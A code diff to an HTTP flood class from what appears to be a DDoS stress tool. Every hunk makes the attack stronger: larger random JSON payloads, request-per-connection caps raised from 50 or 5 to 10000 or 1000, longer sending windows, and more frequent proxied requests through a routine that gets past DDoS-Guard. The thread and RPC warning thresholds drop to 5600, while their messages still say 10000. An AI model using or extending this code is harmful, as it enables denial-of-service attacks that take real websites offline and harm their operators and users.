@@ -839,7 +839,7 @@ class HttpFlood(Thread):
             ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
+             '{"data": %s}') % ProxyTools.Random.rand_str(1000))[:-2]
         s = None
         with  suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -865,7 +865,7 @@ class HttpFlood(Thread):
             ("Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
+             '{"data": %s}') % ProxyTools.Random.rand_str(1000))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -931,7 +931,7 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
+            for _ in range(min(self._rpc, 10000)):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
@@ -974,7 +974,7 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            for _ in range(min(self._rpc, 50)):
+            for _ in range(min(self._rpc, 10000)):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
@@ -1007,7 +1007,7 @@ class HttpFlood(Thread):
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
-                if time() > ts + 120: break
+                if time() > ts + 1000: break
         Tools.safe_close(s)
 
     def AVB(self):
@@ -1025,8 +1025,8 @@ class HttpFlood(Thread):
             if self._proxies:
                 pro = randchoice(self._proxies)
                 with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
-                    for _ in range(min(self._rpc, 5)):
-                        sleep(min(self._rpc, 5) / 100)
+                    for _ in range(min(self._rpc,1000)):
+                        sleep(min(self._rpc, 1000) / 5000)
                         with ss.get(self._target.human_repr(),
                                     proxies=pro.asRequest()) as res:
                             REQUESTS_SENT += 1
@@ -1036,8 +1036,8 @@ class HttpFlood(Thread):
                 Tools.safe_close(ss)
 
             with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
-                for _ in range(min(self._rpc, 5)):
-                    sleep(min(self._rpc, 5) / 100)
+                for _ in range(min(self._rpc, 1000)):
+                    sleep(min(self._rpc, 1000) / 5000)
                     with ss.get(self._target.human_repr()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
@@ -1618,9 +1618,9 @@ if __name__ == '__main__':
                 if not uagents: exit("Empty Useragent File ")
                 if not referers: exit("Empty Referer File ")
 
-                if threads > 10000:
+                if threads > 5600:
                     logger.warning("Thread is higher than 10000")
-                if rpc > 10000:
+                if rpc > 5600:
                     logger.warning(
                         "RPC (Request Pre Connection) is higher than 10000")
 
